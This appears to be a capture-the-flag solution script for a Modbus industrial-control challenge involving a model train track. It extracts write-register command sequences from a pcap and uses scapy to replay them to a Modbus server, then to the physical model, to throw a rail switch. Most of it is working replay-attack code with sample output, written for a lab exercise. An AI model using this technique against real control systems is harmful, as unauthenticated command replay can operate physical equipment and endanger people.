"""
refer to https://github.com/secdev/scapy/blob/master/scapy/contrib/modbus.py
"""

from scapy.all import *
import scapy.contrib.modbus as mb
import socket
import time

# if you look at the traffic in tcpdump or I prefer tcpick

"""
#look for interesting readable stuff

tcpick -yU -r insomniTrains.pcap  | grep -e '[^>]*$'

# extract them

tcpick -yU -r insomniTrains.pcap  | grep '<00><10><03><e9><00><03><06>'
<00><10><03><e9><00><03><06>C1S100
<00><10><03><e9><00><03><06>STS100
<00><10><03><e9><00><03><06>C2S100
<00><10><03><e9><00><03><06>SES100
<00><10><03><e9><00><03><06>C1S300
<00><10><03><e9><00><03><06>STS300
<00><10><03><e9><00><03><06>C2S300
<00><10><03><e9><00><03><06>SES300

"""
# everything that is not between <> is printable character and interesting for us
# other sequences and read/writes can be extracted as well. The number of unique operations is limited. 
# But to keep this writeup short I just exctracted the most interesting from WRITE Multiple registers operation

# It is logical that we can only control something when we write to registers.
# I did not implement and controls triggered by READ on purpose as it would not be realistic.

# so here we extract the ascii we see above and convert to some decimal payload for the modbus library

# I extract those 4 sequences because they all have something in common but the ending is different: 100, 101, 300

# find those sequences in pcap by simply 
C1S100=[17201, 21297, 12336]
STS100=[21332, 21297, 12336]
C2S100=[17202, 21297, 12336]
SES100=[21317, 21297, 12336]

S1_00 = [C1S100,STS100,C2S100,SES100]

C1S101=[17201, 21297, 12337]
STS101=[21332, 21297, 12337]
C2S101=[17202, 21297, 12337]
SES101=[21317, 21297, 12337]

S1_01 = [C1S101,STS101,C2S101,SES101]

C1S300=[17201, 21299, 12336]
STS300=[21332, 21299, 12336]
C2S300=[17202, 21299, 12336]
SES300=[21317, 21299, 12336]

S3_00 = [C1S300,STS300,C2S300,SES300]



"""
Now let's check which sequence really works

Beware, that if sequence is broken by, for instance, a completely wrong command or some random string then internal 
safety state of train system resets to fail safe and switch wont be switched until correct sequence is sent!!!

So random bruteforce wont work.

Solution is to implement smart bruteforce by knowing correct sequences and try each sequence out.
"""

# IMPORTANT: there are also other Writes and Reads in .pcap but some/most of them are garbage!!!
# But the simluator would output GOTOTRAINS in 1016 anyway because correct sequence might trigger correct state even for 1 millisecond
# after that garbage would overwrite the state
# So on the real model stand this millisecond would not be enough to turn the switch
# Only (almost )excat sequence would allow traack to switch. Here is how its doen


def check_solution_reg(sock, seq_arr):
    """
    Reads solution register 1016 and checks if message TRYHARDER is still there
    
    It is possible to go easy way and use pymodbus packages but here is how to construct raw modbus frames using
    ADU and PDU in scapy
    """

    # ADU part
    adu = mb.ModbusADURequest()

    # PDU part for reading the solution message in register 1016
    pdu_read_solution_reg = mb.ModbusPDU03ReadHoldingRegistersRequest(funcCode =3, 
                                                                    startAddr=1016, 
                                                                    quantity=10)
    
    # constructing complete modbus frame to read the registers
    read_solution = adu/pdu_read_solution_reg
    #sending raw frame over the socket
    resp_sol = sock.sr1(read_solution)
    resp_sol.show()
    pkt_str = bytes(resp_sol)

    print(pkt_str)

    if b'TRYHARDER' not in pkt_str:
        print("[+] "*20)
        print("[+] Correct control sequence found! ")
        print(seq_arr)
        # thats what you need to show to get access to real setup
        print("Secret message is ", pkt_str.decode('ascii', errors='replace'))
        input()


def write_cmd_reg(sock, CMD_array):

    """
    CMD_array: is one of the command strings extracted from .pcap file
    It is transmitted to modbus server that evaluates it and controls track
    """

    adu = mb.ModbusADURequest()

    # command to write to the command register from pcap
    pdu_write = mb.ModbusPDU10WriteMultipleRegistersRequest(funcCode =16,
                                                          startAddr=1001,
                                                          quantityRegisters = 3,
                                                          byteCount = 6,
                                                          outputsValue = CMD_array
                                                          )
    # constructing complete modbus frame to write the registers
    write_command = adu/pdu_write
    resp_sol = sock.sr1(write_command)
    
    print(resp_sol.show())

    return resp_sol


def check_sequence(open_sock, seq_arr):
    """
    Check each sequence
    """

    for seq in seq_arr:
        write_cmd_reg(open_sock,seq)
        #allow some delay
        time.sleep(0.1)
    check_solution_reg(open_sock, seq_arr)

def defeat_model(open_sock, correct_sequence):
    for seq in correct_sequence:
        write_cmd_reg(open_sock,seq)
        #allow some delay
        time.sleep(0.1)

def main():
    # constructing Modbus frames
    s = socket.socket()
    s.connect(("127.0.0.1",502))
    # using raw stream
    open_sock = StreamSocket(s,Raw)

    check_sequence(open_sock, S1_00)
    check_sequence(open_sock, S1_01)
    check_sequence(open_sock, S3_00)
    # it is also possible to run all meassages separately if oyu missed that they have common part and should work too
    # but this is much more pretty

    # now attack the model track and win
    defeat_model(open_sock, S1_01)
    # if you send any other sequence on model track, it is going to fail and reset switch back to inside loop positon


"""
run it...

blablabla...

None
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
###[ Raw ]### 
  load      = '\x00\x00\x00\x00\x00\x06\\xff\x10\x03\\xe9\x00\x03'

None
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
###[ Raw ]### 
  load      = '\x00\x00\x00\x00\x00\x17\\xff\x03\x14GOTOTRAINSTATION    '

b'\x00\x00\x00\x00\x00\x17\xff\x03\x14GOTOTRAINSTATION    '
[+] [+] [+] [+] [+] [+] [+] [+] [+] [+] [+] [+] [+] [+] [+] [+] [+] [+] [+] [+] 
[+] Correct control sequence found! 
[[17201, 21299, 12336], [21332, 21299, 12336], [17202, 21299, 12336], [21317, 21299, 12336]]
Secret message is  �GOTOTRAINSTATION   

Congrats you got correct sequence from the virtual challenge!

Now, at the real setup you need to pay attention that the train is out of switch zone (LED is GREEN).
Send your control and sequence with 0.1s delay between each message as asked in train_guide.
And it is going to move the switch and the train is going to exit to the flag area.

"""

if __name__=="__main__":
    main()

# Last bu not leastm it is possible and may be easire to use pymodbus library but I like scapy here as it shows all the details and really teaches you something about the protocol